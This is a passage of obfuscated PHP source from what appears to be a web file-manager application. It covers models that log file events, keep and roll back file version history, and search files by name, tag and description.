$ÚÀ’ŸÂ’ = $¿‡æ×›->sourceInfo($¹Öæ†åÖ); $ñªê‰¥  = $¿‡æ×›->sourceInfo($ô˜Âœ´Ğ); $øò‰€” = array($¤ÃˆÁ©÷[1212] => $¹Öæ†åÖ, $¤ÃˆÁ©÷[2194] => $ÚÀ’ŸÂ’[$¤ÃˆÁ©÷[32]], $¤ÃˆÁ©÷[2170] => !empty($ÚÀ’ŸÂ’[$¤ÃˆÁ©÷[567]]) ? $ÚÀ’ŸÂ’[$¤ÃˆÁ©÷[567]] : $¤ÃˆÁ©÷[12], $¤ÃˆÁ©÷[1213] => $ô˜Âœ´Ğ, $¤ÃˆÁ©÷[2195] => $ñªê‰¥ [$¤ÃˆÁ©÷[32]], $¤ÃˆÁ©÷[2196] => !empty($ñªê‰¥ [$¤ÃˆÁ©÷[567]]) ? $ñªê‰¥ [$¤ÃˆÁ©÷[567]] : $¤ÃˆÁ©÷[12]); $this->addEvent($ÄòûâŞ×, $¤ÃˆÁ©÷[604], $øò‰€”); $áåûà­ = $¿‡æ×›->sourceInfo($ÄòûâŞ×); $øò‰€” = array($¤ÃˆÁ©÷[184] => $áåûà­[$¤ÃˆÁ©÷[184]], $¤ÃˆÁ©÷[32] => $áåûà­[$¤ÃˆÁ©÷[32]]); $this->addEvent($¹Öæ†åÖ, $¤ÃˆÁ©÷[2197], $øò‰€”); } public function eventCopy($âÀõõè¦) { $this->eventCreate($âÀõõè¦, $_SERVER[º·Ï‹¥³][602]); } public function eventRename($×Áë¦İ, $Ëúµ´‘, $ŠÇÂ¹Ò) { $µÜİıñß =& $_SERVER[º·Ï‹¥³]; $¡ÖÚÍÜ™ = array($µÜİıñß[1212] => $Ëúµ´‘, $µÜİıñß[1213] => $ŠÇÂ¹Ò); return $this->addEvent($×Áë¦İ, $µÜİıñß[1402], $¡ÖÚÍÜ™); } public function eventAddComment($ù¬†ñ©€, $ÕŞ­À·) { return $this->addEvent($ù¬†ñ©€, $_SERVER[º·Ï‹¥³][2198], $ÕŞ­À·); } public function eventAddDesc($©§ã ÔÂ, $Š³ìè“¢) { return $this->addEvent($©§ã ÔÂ, $_SERVER[º·Ï‹¥³][2199], $Š³ìè“¢); } public function listBySource($ş˜äÜõÊ) { $éªõµå =& $_SERVER[º·Ï‹¥³]; $óÔ„ø÷ = Model($éªõµå[1388])->sourceInfo($ş˜äÜõÊ); $àäÄ©Ä = array($éªõµå[475] => $ş˜äÜõÊ); if ($óÔ„ø÷[$éªõµå[469]] == $éªõµå[91]) { $×åœáŞş = Model($éªõµå[1388])->listSearchChildren($ş˜äÜõÊ, 20000); $×åœáŞş[] = $ş˜äÜõÊ . $éªõµå[438]; $àäÄ©Ä = array($éªõµå[184] => array($éªõµå[7], $×åœáŞş)); } $›¹»¸Ş¦ = $this->where($àäÄ©Ä)->order($éªõµå[2200])->selectPage(); if ($›¹»¸Ş¦[$éªõµå[426]][$éªõµå[427]] == 0) { $›¹»¸Ş¦[$éªõµå[426]][$éªõµå[427]] = 1; $›¹»¸Ş¦[$éªõµå[429]] = array(array($éªõµå[475] => $ş˜äÜõÊ, $éªõµå[2180] => $óÔ„ø÷[$éªõµå[183]], $éªõµå[1745] => $óÔ„ø÷[$éªõµå[511]], $éªõµå[480] => $éªõµå[2201], $éªõµå[481] => $óÔ„ø÷[$éªõµå[222]], $éªõµå[1747] => $éªõµå[12])); } return $this->eventListParse($›¹»¸Ş¦, $ş˜äÜõÊ); } private function eventListParse($Ó©ˆÚ, $øŠ´Òğ) { $šğí©–ı =& $_SERVER[º·Ï‹¥³]; $›“Õ¢ò = $Ó©ˆÚ[$šğí©–ı[429]]; $ßûà¦™æ = array_to_keyvalue($›“Õ¢ò, $šğí©–ı[12], $šğí©–ı[184]); $€¥Ä ó¤ = array_to_keyvalue($›“Õ¢ò, $šğí©–ı[12], $šğí©–ı[2186]); foreach ($›“Õ¢ò as $Òï³éî) { $´÷õıó¤ = $Òï³éî[$šğí©–ı[510]]; if ($Òï³éî[$šğí©–ı[33]] == $šğí©–ı[604] && isset($´÷õıó¤[$šğí©–ı[1212]])) { $ßûà¦™æ[] = $´÷õıó¤[$šğí©–ı[1212]] . $šğí©–ı[12]; $ßûà¦™æ[] = $´÷õıó¤[$šğí©–ı[1213]] . $šğí©–ı[12]; } if ($Òï³éî[$šğí©–ı[33]] == $šğí©–ı[2197] && isset($´÷õıó¤[$šğí©–ı[184]])) { $ßûà¦™æ[] = $´÷õıó¤[$šğí©–ı[184]] . $šğí©–ı[12]; } } $ßûà¦™æ = array_merge($ßûà¦™æ, $€¥Ä ó¤, array($øŠ´Òğ . $šğí©–ı[12])); $ßûà¦™æ = array_unique($ßûà¦™æ); $Û‹«¤¶š = array_unique(array_to_keyvalue($›“Õ¢ò, $šğí©–ı[12], $šğí©–ı[1754])); $îí‘Áìì = Model($šğí©–ı[583])->userListInfo($Û‹«¤¶š); $ßü´³ªş = Model($šğí©–ı[876])->sourceListInfo($ßûà¦™æ, !0); foreach ($›“Õ¢ò as &$Òï³éî) { if ($Òï³éî[$šğí©–ı[33]] == $šğí©–ı[604] && isset($Òï³éî[$šğí©–ı[510]][$šğí©–ı[1212]])) { $Òï³éî[$šğí©–ı[510]][$šğí©–ı[1212]] = $ßü´³ªş[$Òï³éî[$šğí©–ı[510]][$šğí©–ı[1212]]]; $Òï³éî[$šğí©–ı[510]][$šğí©–ı[1213]] = $ßü´³ªş[$Òï³éî[$šğí©–ı[510]][$šğí©–ı[1213]]]; } if ($Òï³éî[$šğí©–ı[33]] == $šğí©–ı[2197] && isset($Òï³éî[$šğí©–ı[510]][$šğí©–ı[184]])) { $Òï³éî[$šğí©–ı[510]][$šğí©–ı[184]] = $ßü´³ªş[$Òï³éî[$šğí©–ı[510]][$šğí©–ı[184]]]; } $Òï³éî[$šğí©–ı[90]] = $ßü´³ªş[$Òï³éî[$šğí©–ı[184]]]; $Òï³éî[$šğí©–ı[2202]] = $ßü´³ªş[$Òï³éî[$šğí©–ı[2186]]]; if ($Òï³éî[$šğí©–ı[33]] == $šğí©–ı[1921]) { $Òï³éî[$šğí©–ı[2202]] = $Òï³éî[$šğí©–ı[90]]; $Òï³éî[$šğí©–ı[2186]] = $Òï³éî[$šğí©–ı[2202]][$šğí©–ı[184]]; $Òï³éî[$šğí©–ı[90]] = !1; $Òï³éî[$šğí©–ı[184]] = $šğí©–ı[12]; } $Òï³éî[$šğí©–ı[2129]] = $îí‘Áìì[$Òï³éî[$šğí©–ı[1754]]]; } unset($Òï³éî); $Ó©ˆÚ[$šğí©–ı[429]] = $›“Õ¢ò; return $Ó©ˆÚ; } public function removeBySource($Ñ½¾Õ±¶) { $‹©ãÎñ  = array($_SERVER[º·Ï‹¥³][475] => $Ñ½¾Õ±¶); $this->where($‹©ãÎñ )->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\137\x73\x6f\165\x72\x63\145\137\x68\x69\163\164\157\162\171"; public function historyCount($Îš‰°Şß) { $—ßØÑ¡İ =& $_SERVER[º·Ï‹¥³]; if (!$Îš‰°Şß) { return array(); } if (is_string($Îš‰°Şß) || is_int($Îš‰°Şß)) { $Îš‰°Şß = array($Îš‰°Şß); } $¡—ï”ñ = array($—ßØÑ¡İ[184], $—ßØÑ¡İ[1985] => $—ßØÑ¡İ[550]); $¡¹Ûœ»à = array($—ßØÑ¡İ[184] => array($—ßØÑ¡İ[7], $Îš‰°Şß)); $ò¯¡‘ı´ = $this->field($¡—ï”ñ)->where($¡¹Ûœ»à)->group($—ßØÑ¡İ[184])->select(); return array_to_keyvalue($ò¯¡‘ı´, $—ßØÑ¡İ[184], $—ßØÑ¡İ[550]); } public function addHistory($³„ËäÂè, $­¢Ÿ¯‘¢ = '') { $Õ¦¼Øú­ =& $_SERVER[º·Ï‹¥³]; $ûÑéë‡Ÿ = array($Õ¦¼Øú­[475] => $³„ËäÂè[$Õ¦¼Øú­[184]], $Õ¦¼Øú­[1745] => isset($³„ËäÂè[$Õ¦¼Øú­[513]]) ? $³„ËäÂè[$Õ¦¼Øú­[513]] : $³„ËäÂè[$Õ¦¼Øú­[511]], $Õ¦¼Øú­[526] => $³„ËäÂè[$Õ¦¼Øú­[525]], $Õ¦¼Øú­[601] => $³„ËäÂè[$Õ¦¼Øú­[79]], $Õ¦¼Øú­[2203] => $­¢Ÿ¯‘¢); if ($GLOBALS[$Õ¦¼Øú­[6]][$Õ¦¼Øú­[92]][$Õ¦¼Øú­[1270]] >= 1) { $this->historyAutoClear($ûÑéë‡Ÿ[$Õ¦¼Øú­[184]]); $this->add($ûÑéë‡Ÿ); } Hook::trigger($Õ¦¼Øú­[2204], $ûÑéë‡Ÿ); Model($Õ¦¼Øú­[2205])->eventFileEdit($³„ËäÂè[$Õ¦¼Øú­[184]]); } private function historyAutoClear($Àñ›ø×) { $ç¦®½è“ =& $_SERVER[º·Ï‹¥³]; $ÇˆÅíá = Model($ç¦®½è“[822])->get($ç¦®½è“[1292]); $ÂÑõ—øÌ = intval($GLOBALS[$ç¦®½è“[6]][$ç¦®½è“[92]][$ç¦®½è“[1270]]); $’ô¥·ø© = $ÇˆÅíá == $ç¦®½è“[1293] ? min(5, $ÂÑõ—øÌ) : $ÂÑõ—øÌ; $’ô¥·ø© = $’ô¥·ø© <= 0 ? 0 : $’ô¥·ø© - 1; if ($’ô¥·ø© >= 500) { return; } $€êş¼Ûö = array($ç¦®½è“[475] => $Àñ›ø×); $—ş¯³‹ = $this->field($ç¦®½è“[2206])->where($€êş¼Ûö)->order($ç¦®½è“[2200])->select(); if (!$—ş¯³‹ || $’ô¥·ø© >= count($—ş¯³‹)) { return; } $ò£ûØ›Ä = array_to_keyvalue($—ş¯³‹, $ç¦®½è“[12], $ç¦®½è“[459]); $ò£ûØ›Ä = array_slice($ò£ûØ›Ä, $’ô¥·ø©); $Õ•°½è° = array_to_keyvalue($—ş¯³‹, $ç¦®½è“[12], $ç¦®½è“[525]); $Õ•°½è° = array_slice($Õ•°½è°, $’ô¥·ø©); if (!$ò£ûØ›Ä || !$Õ•°½è°) { return; } $€êş¼Ûö = array($ç¦®½è“[477] => array($ç¦®½è“[7], $ò£ûØ›Ä)); $this->where($€êş¼Ûö)->delete(); Model($ç¦®½è“[528])->remove($Õ•°½è°); } public function listData($¹±¸½ÙÉ) { $éœËÙ–Ğ =& $_SERVER[º·Ï‹¥³]; $Ÿ÷±é à = array($éœËÙ–Ğ[475] => $¹±¸½ÙÉ); $âÀ·›ğ… = $éœËÙ–Ğ[2207]; $¡ãÂ¤ = $this->field($âÀ·›ğ…)->where($Ÿ÷±é à)->order($éœËÙ–Ğ[2200])->selectPage(); $this->_listAppendUser($¡ãÂ¤[$éœËÙ–Ğ[429]]); $ˆÁ¼ÔÏï = Model($éœËÙ–Ğ[822])->get($éœËÙ–Ğ[1292]); $¼€·²ğ» = 5; if ($ˆÁ¼ÔÏï == $éœËÙ–Ğ[1293]) { $¡ãÂ¤[$éœËÙ–Ğ[429]] = array_slice($¡ãÂ¤[$éœËÙ–Ğ[429]], 0, $¼€·²ğ»); $¡ãÂ¤[$éœËÙ–Ğ[426]] = array($éœËÙ–Ğ[2208] => 1, $éœËÙ–Ğ[2209] => 20, $éœËÙ–Ğ[2210] => 1, $éœËÙ–Ğ[2211] => count($¡ãÂ¤[$éœËÙ–Ğ[429]])); } return $¡ãÂ¤; } protected function _listAppendUser(&$–¸ÍÕ½€) { $ÓíİªòË =& $_SERVER[º·Ï‹¥³]; $ô•»™Õ = array_to_keyvalue($–¸ÍÕ½€, $ÓíİªòË[12], $ÓíİªòË[1754]); $–Æ£°êË = Model($ÓíİªòË[583])->userListInfo($ô•»™Õ); foreach ($–¸ÍÕ½€ as &$æÖıïĞ’) { $“›¸Ê‚µ = $æÖıïĞ’[$ÓíİªòË[1754]]; $æÖıïĞ’[$ÓíİªòË[511]] = $–Æ£°êË[$“›¸Ê‚µ] ? $–Æ£°êË[$“›¸Ê‚µ] : !1; } unset($æÖıïĞ’); } public function fileInfo($ú¬Êó‡) { $•äÜ»ª =& $_SERVER[º·Ï‹¥³]; $ªôˆ¶±ë = $this->tablePrefix; $…º¨‰’Ó = "{$ªôˆ¶±ë}\151\157\137\146\x69\154\x65\x20\146\151\154\145\163\x20\157\156\40\x66\x69\154\x65\163\56\x66\151\154\x65\x49\104\x20\75\40\150\x69\x73\x74\157\x72\171\x2e\x66\x69\x6c\x65\111\104"; return $this->alias($•äÜ»ª[2212])->where(array($•äÜ»ª[477] => $ú¬Êó‡))->join($…º¨‰’Ó, $•äÜ»ª[2213])->find(); } public function removeItem($Õà¨¯é) { $íÙšÈîÈ =& $_SERVER[º·Ï‹¥³]; $œíŸÀ = array($íÙšÈîÈ[477] => $Õà¨¯é); $ø›»™‰­ = $this->where($œíŸÀ)->find(); if ($ø›»™‰­) { $ˆÎÒ—»  = $this->where($œíŸÀ)->delete(); Model($íÙšÈîÈ[528])->remove($ø›»™‰­[$íÙšÈîÈ[525]]); return $ˆÎÒ—» ; } return !1; } public function removeBySource($Ë«‡’‚ş) { $ê¨Ğ²ëŞ =& $_SERVER[º·Ï‹¥³]; if (!$Ë«‡’‚ş) { return !1; } if (!is_array($Ë«‡’‚ş)) { $Ë«‡’‚ş = array($Ë«‡’‚ş); } $Ì§ÖÕ°ı = array($ê¨Ğ²ëŞ[475] => array($ê¨Ğ²ëŞ[7], $Ë«‡’‚ş)); $¼•£Óö = $this->field($ê¨Ğ²ëŞ[526])->where($Ì§ÖÕ°ı)->select(); if ($¼•£Óö) { $this->where($Ì§ÖÕ°ı)->delete(); $Ş½Öö§Ô = array_to_keyvalue($¼•£Óö, $ê¨Ğ²ëŞ[12], $ê¨Ğ²ëŞ[525]); Model($ê¨Ğ²ëŞ[528])->remove($Ş½Öö§Ô); } return !0; } public function setDetail($šˆ­¼, $ıùÛÖ‰î) { $×±œ÷µÛ =& $_SERVER[º·Ï‹¥³]; return $this->where(array($×±œ÷µÛ[477] => $šˆ­¼))->save(array($×±œ÷µÛ[2203] => $ıùÛÖ‰î)); } public function rollbackToItem($ß³˜ÀÔ—, $à‡ëİŠô) { $ƒ¬ÕÎæ„ =& $_SERVER[º·Ï‹¥³]; $ÙÔ¢ê¢ì = Model($ƒ¬ÕÎæ„[876])->sourceInfo($ß³˜ÀÔ—); $this->addHistory($ÙÔ¢ê¢ì, LNG($ƒ¬ÕÎæ„[2214])); $ˆ÷³®¥ø = $this->find($à‡ëİŠô); $¤Èµ = array($ƒ¬ÕÎæ„[525] => $ˆ÷³®¥ø[$ƒ¬ÕÎæ„[525]], $ƒ¬ÕÎæ„[79] => $ˆ÷³®¥ø[$ƒ¬ÕÎæ„[79]], $ƒ¬ÕÎæ„[88] => time(), $ƒ¬ÕÎæ„[513] => USER_ID); Model($ƒ¬ÕÎæ„[876])->where(array($ƒ¬ÕÎæ„[184] => $ß³˜ÀÔ—))->save($¤Èµ); return $this->where(array($ƒ¬ÕÎæ„[477] => $à‡ëİŠô))->delete(); } public function clearSame($§šêÅÂ) { $¨şèÈø =& $_SERVER[º·Ï‹¥³]; $ŠÜ€âï = $this->listData($§šêÅÂ); $¹¬©Ô– = array_to_keyvalue_group($ŠÜ€âï, $¨şèÈø[525]); $ÈÜ”÷…ˆ = array(); $®ÕÔ¹óù = array(); foreach ($¹¬©Ô– as $ş¹ˆØê) { if (!$ş¹ˆØê || count($ş¹ˆØê) <= 1) { continue; } foreach ($ş¹ˆØê as $ğ¯×öğ) { $ÈÜ”÷…ˆ[] = $ğ¯×öğ[$¨şèÈø[525]]; $®ÕÔ¹óù[] = $ğ¯×öğ[$¨şèÈø[459]]; } } if (!$®ÕÔ¹óù) { return; } $this->where(array($¨şèÈø[459] => array($¨şèÈø[7], $®ÕÔ¹óù)))->delete(); Model($¨şèÈø[528])->remove($ÈÜ”÷…ˆ); } public function userSpace() { $ÔÔ—ƒ¾Œ =& $_SERVER[º·Ï‹¥³]; $ÂìõÏÆÁ = $this->tablePrefix; $şÀ†Üç = array($ÔÔ—ƒ¾Œ[1745] => USER_ID); $†ÅÇÆÂ× = "{$ÂìõÏÆÁ}\x69\157\137\x66\x69\154\145\x20\146\x69\154\145\163\x20\157\x6e\x20\146\x69\x6c\145\163\x2e\x66\x69\154\x65\111\104\40\x3d\x20\x68\x69\x73\x74\157\x72\x79\56\146\151\x6c\145\111\104"; return $this->alias($ÔÔ—ƒ¾Œ[2212])->where($şÀ†Üç)->join($†ÅÇÆÂ×, $ÔÔ—ƒ¾Œ[2213])->sum($ÔÔ—ƒ¾Œ[79]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($ªŠœÒ“§) { $èä§±ßÑ =& $_SERVER[º·Ï‹¥³]; $Ñ…–ä = KodIO::fileTypeList(); $Æ“¼ûÏ = $Ñ…–ä[$ªŠœÒ“§]; if (!$Æ“¼ûÏ) { return array(); } $ÑË‘„àŞ = $Æ“¼ûÏ[$èä§±ßÑ[178]]; $àÊç•é = $èä§±ßÑ[7]; if (!$Æ“¼ûÏ[$èä§±ßÑ[178]]) { $ïó¥æû = array_to_keyvalue($Ñ…–ä, $èä§±ßÑ[12], $èä§±ßÑ[178]); $ÑË‘„àŞ = implode($èä§±ßÑ[50], $ïó¥æû); $àÊç•é = $èä§±ßÑ[2215]; } $îªÌµğŠ = explode($èä§±ßÑ[50], trim($ÑË‘„àŞ, $èä§±ßÑ[50])); return array($àÊç•é, $îªÌµğŠ); } public function listPathType($¦§´÷¯) { $ğúÙ˜ªü =& $_SERVER[º·Ï‹¥³]; $ûÈ«­Å÷ = $this->fileTypeWhere($¦§´÷¯); if (!$ûÈ«­Å÷) { return array(); } $ıËú´éŞ = USER_ID; $Ú¦§Ğë÷ = Model($ğúÙ˜ªü[583])->getInfo($ıËú´éŞ); $¹ü•»ìÂ = array($ğúÙ˜ªü[632] => SourceModel::TYPE_USER, $ğúÙ˜ªü[569] => array($ğúÙ˜ªü[596], $ğúÙ˜ªü[579] . $Ú¦§Ğë÷[$ğúÙ˜ªü[90]][$ğúÙ˜ªü[184]] . $ğúÙ˜ªü[597]), $ğúÙ˜ªü[633] => $ıËú´éŞ, $ğúÙ˜ªü[630] => 0, $ğúÙ˜ªü[631] => $ûÈ«­Å÷); return $this->listSource($¹ü•»ìÂ); } public function listSearch($±ÛªŒ•ú, $Ú¿İÅŞƒ = 300) { $‰Ô¸Å =& $_SERVER[º·Ï‹¥³]; if (isset($±ÛªŒ•ú[$‰Ô¸Å[2051]]) && $±ÛªŒ•ú[$‰Ô¸Å[2051]]) { $±ÛªŒ•ú[$‰Ô¸Å[2051]] = str_replace($‰Ô¸Å[444], $‰Ô¸Å[2216], trim($±ÛªŒ•ú[$‰Ô¸Å[2051]])); } $Å§ÚÖëš = $this->_parseSearchWhere($±ÛªŒ•ú); if (!isset($Å§ÚÖëš[$‰Ô¸Å[489]])) { $Å§ÚÖëš[$‰Ô¸Å[489]] = 0; } $Õñï   = $‰Ô¸Å[2217]; $¬àÔĞÊÈ = $Å§ÚÖëš; $¾”¿ÍÌò = $Õñï  ; $this->_listSearchBindPinyin($±ÛªŒ•ú, $Å§ÚÖëš, $Õñï  ); $this->alias($‰Ô¸Å[503])->_makeOrder(); $Å§ÚÖëš = $this->parseWhereLike($Å§ÚÖëš); $¸í†÷–Ş = $this->distinct(!0)->field($Õñï  )->where($Å§ÚÖëš)->selectPage($Ú¿İÅŞƒ); if ($GLOBALS[$‰Ô¸Å[6]][$‰Ô¸Å[441]][$‰Ô¸Å[442]] && Input::check($±ÛªŒ•ú[$‰Ô¸Å[2051]], $‰Ô¸Å[639]) && $¸í†÷–Ş[$‰Ô¸Å[426]][$‰Ô¸Å[404]] == 1 && $¸í†÷–Ş[$‰Ô¸Å[426]][$‰Ô¸Å[427]] == 0) { $¸í†÷–Ş = $this->distinct(!0)->field($Õñï  )->where($¬àÔĞÊÈ)->limit(1000)->select(); $¸í†÷–Ş = array_page_split($¸í†÷–Ş, !1, $Ú¿İÅŞƒ); } $this->_listSearchFileContent($¸í†÷–Ş, $±ÛªŒ•ú, $¾”¿ÍÌò, $¬àÔĞÊÈ); $this->_listSearchDesc($¸í†÷–Ş, $±ÛªŒ•ú, $¾”¿ÍÌò); $this->_listSearchTag($¸í†÷–Ş, $±ÛªŒ•ú, $¾”¿ÍÌò); $this->_listSearchGroupTag($¸í†÷–Ş, $±ÛªŒ•ú, $¾”¿ÍÌò); $this->_listDataApply($¸í†÷–Ş[$‰Ô¸Å[429]]); $this->_listMake($¸í†÷–Ş); return $¸í†÷–Ş; } private function _listSearchFileContent(&$¶©·Â¨÷, $¯ ˜²Ÿğ, $öïé, $ÉÏµİ£•) { $ë‹ëøœ¬ =& $_SERVER[º·Ï‹¥³]; if (!$¯ ˜²Ÿğ[$ë‹ëøœ¬[2051]] || $¶©·Â¨÷[$ë‹ëøœ¬[426]][$ë‹ëøœ¬[404]] > 1) { return; } if (!isset($ÉÏµİ£•[$ë‹ëøœ¬[32]]) || !is_array($¯ ˜²Ÿğ[$ë‹ëøœ¬[525]])) { return; } $ÉÏµİ£•[$ë‹ëøœ¬[525]] = array($ë‹ëøœ¬[7], $¯ ˜²Ÿğ[$ë‹ëøœ¬[525]]); unset($ÉÏµİ£•[$ë‹ëøœ¬[32]]); unset($¯ ˜²Ÿğ[$ë‹ëøœ¬[525]]); $ç¥‰‘øŠ = $this->field($öïé)->where($ÉÏµİ£•)->limit($ë‹ëøœ¬[2218])->select(); if (!$ç¥‰‘øŠ || count($ç¥‰‘øŠ) == 0) { return; } $¶©·Â¨÷[$ë‹ëøœ¬[429]] = array_merge($ç¥‰‘øŠ, $¶©·Â¨÷[$ë‹ëøœ¬[429]]); $¶©·Â¨÷[$ë‹ëøœ¬[426]][$ë‹ëøœ¬[427]] += count($ç¥‰‘øŠ); } private function _listSearchTag(&$³òŠÓÂî, $æ•Úàİ‘, $à«Ø¤û¼) { $–Ìã¿ˆ =& $_SERVER[º·Ï‹¥³]; if (!$æ•Úàİ‘[$–Ìã¿ˆ[2051]] || $³òŠÓÂî[$–Ìã¿ˆ[426]][$–Ìã¿ˆ[404]] > 1) { return; } $ßÑã‹Á¼ = Model($–Ìã¿ˆ[2219])->listData(); $˜–Ó± = array(); $‡©âœİº = $æ•Úàİ‘[$–Ìã¿ˆ[2051]]; foreach ($ßÑã‹Á¼ as $·îŒË¹ˆ) { $öö•ğÅ¬ = $·îŒË¹ˆ[$–Ìã¿ˆ[32]]; $Ó³ëƒ–å = str_replace($–Ìã¿ˆ[53], $–Ìã¿ˆ[12], Pinyin::get($öö•ğÅ¬)); if (stripos($öö•ğÅ¬, $‡©âœİº) !== !1 || stripos($Ó³ëƒ–å, $‡©âœİº) !== !1) { $˜–Ó±[] = $·îŒË¹ˆ[$–Ìã¿ˆ[459]]; } } if (!$˜–Ó±) { return; } $İõÛÁëÜ = array($–Ìã¿ˆ[484] => array($–Ìã¿ˆ[7], $˜–Ó±), $–Ìã¿ˆ[1754] => USER_ID); $†×Ú±² = Model($–Ìã¿ˆ[486])->field($–Ìã¿ˆ[87])->where($İõÛÁëÜ)->select(); $†×Ú±² = array_to_keyvalue($†×Ú±², $–Ìã¿ˆ[12], $–Ìã¿ˆ[87]); $ãƒ¥æíË = array_unique($†×Ú±²); $this->_listSearchMerge($³òŠÓÂî, $æ•Úàİ‘, $à«Ø¤û¼, $ãƒ¥æíË); } private function _listSearchDesc(&$á¡‹Íœ, $ë½ç¦×, $®é™Õ±¥) { $ìí¡£Å =& $_SERVER[º·Ï‹¥³]; if (!$ë½ç¦×[$ìí¡£Å[2051]] || $á¡‹Íœ[$ìí¡£Å[426]][$ìí¡£Å[404]] > 1) { return; } $°ß…Ÿ°ë = array($ìí¡£Å[97] => $ìí¡£Å[510], $ìí¡£Å[434] => array($ìí¡£Å[443], $ìí¡£Å[2053] . $ë½ç¦×[$ìí¡£Å[2051]] . $ìí¡£Å[2053])); $ğ¡—øó™ = !1; if ($ğ¡—øó™) { $¹Ğú¦áœ = $this->listSearchChildren($ë½ç¦×[$ìí¡£Å[183]]); $¹Ğú¦áœ = array_unique($¹Ğú¦áœ); if (!$¹Ğú¦áœ) { return; } $°ß…Ÿ°ë[$ìí¡£Å[184]] = array($ìí¡£Å[7], $¹Ğú¦áœ); } $Ğªª¿æ˜ = Model($ìí¡£Å[616])->field($ìí¡£Å[184])->where($°ß…Ÿ°ë)->limit(5000)->select(); $µû×†‡× = array_to_keyvalue($Ğªª¿æ˜, $ìí¡£Å[12], $ìí¡£Å[184]); $this->_listSearchMerge($á¡‹Íœ, $ë½ç¦×, $®é™Õ±¥, $µû×†‡×); } private function _listSearchGroupTag(&$õÛéı£Š, $„ÂÀ•éî, $ÇƒòÇ¿‰) { $…ˆ×ßâ× =& $_SERVER[º·Ï‹¥³]; if (!$„ÂÀ•éî[$…ˆ×ßâ×[2051]] || $õÛéı£Š[$…ˆ×ßâ×[426]][$…ˆ×ßâ×[404]] > 1 || !$„ÂÀ•éî[$…ˆ×ßâ×[183]]) { return; } $¥’ù¿Ôò = $this->sourceInfo($„ÂÀ•éî[$…ˆ×ßâ×[183]]); if (!$¥’ù¿Ôò || $¥’ù¿Ôò[$…ˆ×ßâ×[181]] != SourceModel::TYPE_GROUP) { return; } $ÅŸïåğò = $¥’ù¿Ôò[$…ˆ×ßâ×[554]]; $ìÀ¾ïÓğ = Model($…ˆ×ßâ×[2220])->get($ÅŸïåğò); $Ì×âÖ÷ = array(); $†ÀÔÄ € = $„ÂÀ•éî[$…ˆ×ßâ×[2051]]; foreach ($ìÀ¾ïÓğ[$…ˆ×ßâ×[429]] as $àåáÇÎ) { $ºØÕøØ = $àåáÇÎ[$…ˆ×ßâ×[32]]; $‚ÍıåÙí = str_replace($…ˆ×ßâ×[53], $…ˆ×ßâ×[12], Pinyin::get($ºØÕøØ)); if (stripos($ºØÕøØ, $†ÀÔÄ €) !== !1 || stripos($‚ÍıåÙí, $†ÀÔÄ €) !== !1) { $Ì×âÖ÷[] = $àåáÇÎ[$…ˆ×ßâ×[459]]; } } if (!$Ì×âÖ÷) { return; } $œ×ıŞ«‹ = array($…ˆ×ßâ×[484] => array($…ˆ×ßâ×[7], $Ì×âÖ÷), $…ˆ×ßâ×[1754] => 0, $…ˆ×ßâ×[33] => $…ˆ×ßâ×[2073] . $ÅŸïåğò); $Ìƒµ­µÀ = Model($…ˆ×ßâ×[486])->field($…ˆ×ßâ×[87])->where($œ×ıŞ«‹)->select(); $Ìƒµ­µÀ = array_to_keyvalue($Ìƒµ­µÀ, $…ˆ×ßâ×[12], $…ˆ×ßâ×[87]); $×Œº²“ = array_unique($Ìƒµ­µÀ); $this->_listSearchMerge($õÛéı£Š, $„ÂÀ•éî, $ÇƒòÇ¿‰, $×Œº²“); } private function _listSearchMerge(&$¾¾¢ÜİÓ, $ÛÖ¨Ä«, $öÖÁ††ş, $ˆ‘ı©²¹) { $¬ğ‰§€Í =& $_SERVER[º·Ï‹¥³]; if (!$ˆ‘ı©²¹) { return; } $Õ¥çãÏ³ = array_to_keyvalue($¾¾¢ÜİÓ[$¬ğ‰§€Í[429]], $¬ğ‰§€Í[12], $¬ğ‰§€Í[184]); $ß»ä¥«ï = array_diff($ˆ‘ı©²¹, $Õ¥çãÏ³); if (!$ß»ä¥«ï) { return; } $¯¹Ëá×Ù = array($¬ğ‰§€Í[184] => array($¬ğ‰§€Í[7], $ß»ä¥«ï)); $ú¾ôˆŸ§ = $this->field($öÖÁ††ş)->where($¯¹Ëá×Ù)->select(); if (!$ú¾ôˆŸ§) { return; } $¢ÇàŞ‹ = array(); foreach ($ú¾ôˆŸ§ as $°éïê†ö) { if ($this->_listSearchFilter($°éïê†ö, $ÛÖ¨Ä«)) { $¢ÇàŞ‹[] = $°éïê†ö; } } $¾¾¢ÜİÓ[$¬ğ‰§€Í[429]] = array_merge($¢ÇàŞ‹, $¾¾¢ÜİÓ[$¬ğ‰§€Í[429]]); $¾¾¢ÜİÓ[$¬ğ‰§€Í[426]][$¬ğ‰§€Í[427]] += count($¢ÇàŞ‹); } private function _listSearchFilter($±Ãª, $‹±Äß¯®) { $±ı ¢²ó =& $_SERVER[º·Ï‹¥³]; $‹Şéï³Â = $±Ãª[$±ı ¢²ó[469]] == $±ı ¢²ó[91]; if (!strstr($±Ãª[$±ı ¢²ó[569]], $±ı ¢²ó[50] . $‹±Äß¯®[$±ı ¢²ó[183]] . $±ı ¢²ó[50])) { return !1; } if (isset($‹±Äß¯®[$±ı ¢²ó[470]]) && $‹±Äß¯®[$±ı ¢²ó[470]] != $±ı ¢²ó[2008]) { if ($‹±Äß¯®[$±ı ¢²ó[470]] == $±ı ¢²ó[78] && !$‹Şéï³Â) { return !1; } if ($‹±Äß¯®[$±ı ¢²ó[470]] != $±ı ¢²ó[78] && $‹Şéï³Â) { return !1; } if (!strstr($±Ãª[$±ı ¢²ó[178]], $±ı ¢²ó[50] . $‹±Äß¯®[$±ı ¢²ó[470]] . $±ı ¢²ó[50])) { return !1; } } if (isset($‹±Äß¯®[$±ı ¢²ó[2221]]) && $‹±Äß¯®[$±ı ¢²ó[2221]] < $±Ãª[$±ı ¢²ó[79]]) { return !1; } if (isset($‹±Äß¯®[$±ı ¢²ó[2222]]) && $‹±Äß¯®[$±ı ¢²ó[2222]] > $±Ãª[$±ı ¢²ó[79]]) { return !1; } if (isset($‹±Äß¯®[$±ı ¢²ó[646]]) && $‹±Äß¯®[$±ı ¢²ó[646]] != $±Ãª[$±ı ¢²ó[513]]) { return !1; } return !0; } public function listSearchChildren($ß”àáÙŒ, $†÷¬É¥ß = 5000) { $ë´úêØê =& $_SERVER[º·Ï‹¥³]; $¨§Æœ¾¨ = array(); $úÑò‘…² = 